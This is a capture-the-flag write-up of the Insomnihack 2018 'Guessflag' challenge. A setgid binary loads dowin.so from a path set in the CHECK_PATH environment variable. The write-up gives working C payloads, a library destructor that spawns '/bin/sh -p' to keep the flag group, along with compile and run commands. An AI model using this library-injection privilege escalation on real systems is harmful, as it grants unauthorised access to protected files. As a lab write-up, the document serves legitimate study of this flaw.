# Guessflag

Guessflag was a warmup pwn at **Insomnihack 2018**. It was a fairly easy challenge, but we struggled a lot on small details.

## The challenge

We were given ssh access to a remote server, and the challenge was in `/home/flag` there.
There we could find a shared lib (`dowin.so`), the main binary (`guessflag`), and a text file (`flag.txt`).

We could see that `guessflag` **was setgid** and that **the owner of both the** `flag.txt` **file and the** `guessflag` **binary was part of the group "flag".**

```bash
user1@insomniak:/home/flag$ ls -al
total 32
drwxr-xr-x  2 root root  4096 Mar 26 13:18 .
drwxr-xr-x 12 root root 4096 Mar 26 12:50 ..
-rwxr-xr-x  1 root root  7512 Mar 26 12:50 dowin.so
-rwxr-sr-x  1 root flag  8520 Mar 26 12:51 guessflag
-rw-r-----  1 root flag   262 Mar 26 13:18 flag.txt
```

With this information, we knew that we'd probably have to exploit the `guessflag` binary to run commands as a member of the "flag" group in order to read `flag.txt`, which most likely contains the flag.

## Analysis

Let's start with some analysis of the binary.

First we look at the output of the `file` command:

```bash
user1@insomniak:/home/flag$ file guessflag                                                                                                                      
guessflag: setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped
```

It tells us that `guessflag` is **compiled as a dynamic binary**, which means that it relies on the `libc` of the remote server for standard functions like `printf` et al.! We could make it use our own standard function using  [LD_PRELOAD trick](https://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/), but from our little experience, we know that **LD_PRELOAD is ignored when the binary is setuid or setgid**, which is the case here.

So let's move on and look at the output of `ltrace`.

```bash
user1@insomniak:/home/flag$ ltrace ./guessflag                                                                                                                    
puts("Can you guess the flag ?"Can you guess the flag ?
)                                                                                        = 25
+++ exited (status 255) +++
```

Nothing fancy here, let's try with an argument.

```bash
user1@insomniak:/home/flag$ ltrace ./guessflag arg                                                                                                                   
puts("Can you guess the flag ?"Can you guess the flag ?
)                                                                                        = 25
getenv("CHECK_PATH")                                                                                                    = nil
snprintf("(null)/dowin.so", 1024, "%s/dowin.so", nil)                                                                   = 15
dlopen("(null)/dowin.so", 1)                                                                                            = 0
+++ exited (status 255) +++
```

Uuh! Looks like it **first checks if we passed an argument, and if so, tries to get the content of the environment variable CHECK_PATH**.

Let's try to set this variable : 

```bash
user1@insomniak:/home/flag$ CHECK_PATH=test ltrace ./guessflag arg                                                                                                   
puts("Can you guess the flag ?"Can you guess the flag ?
)                                                                                        = 25
getenv("CHECK_PATH")                                                                                                    = "test"
snprintf("test/dowin.so", 1024, "%s/dowin.so", "test")                                                                  = 13
dlopen("test/dowin.so", 1)                                                                                              = 0
+++ exited (status 255) +++
```

Alright, so it looks like it **appends the content of CHECK_PATH to the string "/dowin.so" and then tries to use `dlopen` on it**. This means that if we set the CHECK_PATH variable to something like `/tmp/pld` and create our own `dowin.so` in this directory, it will load it !

## Exploit

I had never met the `dlopen` function before, but it's really straightforward.
It simply opens a shared object whose path is passed as a parameter and gives you the ability to execute the functions it provides.

The problem here is that we can not create just any random function and simply load our library, as it would never get called.

We struggled a bit here, and [Geluchat](https://dailysecurity.fr) gave us a neat trick: **it is possible to use the [.fini section](http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html) by creating a destructor in our custom `dowin.so`, and which will execute when the lib is unloaded** (*i.e. when the binary exits, here*).

We ended up with the following payload:

```c
#include <unistd.h>

void begin (void) __attribute__((destructor));

void begin (void) {
	system("id && whoami");
}


```

We set up the exploit in tmp: 

```bash
user1@insomniak:/home/flag$ mkdir /tmp/pld && cd /tmp/pld
user1@insomniak:/tmp/pld$ gcc -o dowin.so -fPIC -shared payload.c
user1@insomniak:/tmp/pld$ export CHECK_PATH=/tmp/pld ./guessflag a
Can you guess the flag ?
uid=1005(user1) gid=985(users) groups=985(users)
user1
```

Yeah nice, our destructor got executed!
But, wait… The permissions were dropped :( WHHHhhyYyyy ?

We struggled for about 2 hours on this, and then asked for a bit of help to a member of Securimag.

He told us that on this machine, /bin/sh was a symlink to /bin/bash, **which drops the setuid and setgid permissions by default when it is called**.

Using `man system`, we can easily figure out that `system()` simply calls `/bin/sh` with the argument it is passed.

He also told us that **the `-p` argument on `/bin/sh` prevents it from dropping the permissions**.

That gave us our second payload: 

```c
void begin (void) __attribute__((destructor));

void begin (void) {
	char *envp[] = { NULL };
	char *argv[] = { "/bin/sh", "-p", NULL };
	execve("/bin/sh", argv, envp);
}
```

We compile and run it…

```
user1@insomniak:/tmp/pld$ gcc -o dowin.so -fPIC -shared payload.c
user1@insomniak:/tmp/pld$ CHECK_PATH=/tmp/pld ./guessflag a
Can you guess the flag ?
user1@insomniak:/tmp/pld$ id
uid=1005(user1) gid=985(users) groups=985(users), 990(flag)
```

Yay! We got a shell in the `flag` group :D

```
user1@insomniak:/tmp/pld$ cat /home/flag/flag.txt
INS{th4t_library_was_usele$$}
```

Aaand… **Flagged!**
